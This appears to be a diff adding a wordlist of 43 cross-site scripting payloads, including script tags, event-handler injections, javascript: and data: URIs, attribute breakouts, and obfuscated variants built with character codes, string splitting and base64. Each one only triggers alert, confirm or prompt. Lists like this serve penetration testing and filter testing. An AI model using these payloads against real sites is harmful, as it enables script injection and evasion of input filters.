@@ -1,0 +1,43 @@
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(1) >
+<img src=x onerror=alert(1)//
+<img src=x onerror=alert(1);//
+<img src=x onerror=window['alert'](1)>
+<img src=x onerror=eval('al'+'ert(1)')>
+<img src=x onerror=top['al'+'ert'](1)>
+<img src=x onerror=this['al'+'ert'](1)>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+<img src=x onerror=alert(/XSS/.source)>
+<script>alert(/XSS/)</script>
+<script>window[String.fromCharCode(97,108,101,114,116)](1)</script>
+<img src=x onerror=confirm(1)>
+<img src=x onerror=prompt(1)>
+<svg/onload=alert(1)>
+<svg onload=alert(1)>
+<svg%20onload=alert(1)>
+<svg/onload=alert(1)//
+<svg onload=alert(1)//
+<svg onload=alert(1) x=
+<body/onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<IFRAME SRC=javascript:alert(1)>
+<details open ontoggle=alert(1)>
+<details open ontoggle=confirm(1)>
+<marquee onstart=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video poster=javascript:alert(1)>
+<math><a xlink:href=javascript:alert(1)>click</a></math>
+<script>throw onerror=alert,1</script>
+<script>onerror=alert;throw 1</script>
+"><ScRiPt>alert(1)</ScRiPt>
+"><svg onload=alert(1)>
+" autofocus onfocus=alert(1) x="
+' autofocus onfocus=alert(1) x='
+" onfocus=alert(1) autofocus x="
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
